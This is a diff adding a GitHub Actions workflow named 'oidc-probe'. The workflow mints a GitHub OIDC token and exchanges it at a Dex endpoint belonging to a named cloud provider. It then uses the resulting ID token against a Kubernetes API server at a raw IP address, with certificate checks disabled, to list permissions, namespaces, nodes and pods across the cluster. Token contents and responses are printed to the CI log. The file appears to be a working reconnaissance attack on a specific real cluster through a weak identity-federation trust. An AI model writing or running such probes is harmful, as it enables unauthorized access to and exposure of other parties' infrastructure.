@@ -1,0 +1,35 @@
+name: oidc-probe
+on:
+  workflow_dispatch:
+  push:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: OIDC token + Dex exchange + k8s probes
+        run: |
+          set -x
+          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=kubernetes" | jq -r .value)
+          echo "github_oidc_len=${#TOKEN}"
+          echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | head -c 800; echo
+          echo "=== DEX EXCHANGE ==="
+          RESP=$(curl -sS -X POST https://dex.3209e979-k8s.cloud.together.ai/token -d grant_type=urn:ietf:params:oauth:grant-type:token-exchange -d "subject_token=$TOKEN" -d subject_token_type=urn:ietf:params:oauth:token-type:jwt -d connector_id=github-actions -d client_id=kubernetes -d audience=kubernetes)
+          echo "$RESP" | head -c 1200; echo
+          ID=$(echo "$RESP" | jq -r .id_token)
+          echo "dex_id_len=${#ID}"
+          echo "$ID" | cut -d. -f2 | base64 -d 2>/dev/null | head -c 800; echo
+          echo "=== SSR RULES default ==="
+          curl -sS -k -X POST https://208.185.136.145:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H "Authorization: Bearer $ID" -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' | head -c 2500; echo
+          echo "=== SSR RULES kube-system ==="
+          curl -sS -k -X POST https://208.185.136.145:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H "Authorization: Bearer $ID" -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"kube-system"}}' | head -c 2500; echo
+          echo "=== NAMESPACES ==="
+          curl -sS -k https://208.185.136.145:6443/api/v1/namespaces -H "Authorization: Bearer $ID" | head -c 1500; echo
+          echo "=== NODES ==="
+          curl -sS -k https://208.185.136.145:6443/api/v1/nodes -H "Authorization: Bearer $ID" | head -c 1500; echo
+          echo "=== PODS ALL NS ==="
+          curl -sS -k https://208.185.136.145:6443/api/v1/pods -H "Authorization: Bearer $ID" | head -c 1500; echo
+          echo "=== VERSION ==="
+          curl -sS -k https://208.185.136.145:6443/version -H "Authorization: Bearer $ID" | head -c 600; echo
